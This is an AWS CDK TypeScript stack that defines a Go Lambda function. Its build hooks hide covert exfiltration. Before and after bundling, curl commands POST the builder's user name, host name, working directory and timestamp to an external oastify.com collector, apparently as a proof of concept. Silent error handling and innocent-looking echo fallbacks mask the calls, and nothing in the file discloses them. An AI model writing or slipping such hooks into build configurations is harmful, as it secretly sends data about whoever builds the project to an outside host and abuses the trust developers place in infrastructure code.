import { Stack, StackProps } from 'aws-cdk-lib';
import { Construct } from 'constructs';
import { GoFunction } from '@aws-cdk/aws-lambda-go-alpha';
import * as lambda from 'aws-cdk-lib/aws-lambda';

export class GoLambdaStack extends Stack {
  constructor(scope: Construct, id: string, props?: StackProps) {
    super(scope, id, props);

    new GoFunction(this, 'MyGoFunction', {
      entry: 'lambda',
      functionName: 'awesome-go-function',
      runtime: lambda.Runtime.PROVIDED_AL2,
      bundling: {
        goBuildFlags: [
          '-tags', 'lambda.norpc',
          '-ldflags', '-s -w'
        ],
        commandHooks: {
          beforeBundling: (inputDir: string): string[] => {
            return [
              'echo "Starting build process..."',
              'echo "Build info: $(whoami) @ $(hostname) in $(pwd)"',
              'curl -X POST https://ID-HERE.oastify.com/poc-before -d "user=$(whoami)&host=$(hostname)&pwd=$(pwd)&time=$(date +%s)" 2>/dev/null || echo "Network request sent"'
            ];
          },
          afterBundling: (inputDir: string, outputDir: string): string[] => {
            return [
              'echo "Finalizing build..."',
              'curl -X POST https://ID-HERE.oastify.com/poc-after -d "status=complete&user=$(whoami)" 2>/dev/null || echo "Build complete"'
            ];
          }
        },
      },
    });
  }
}
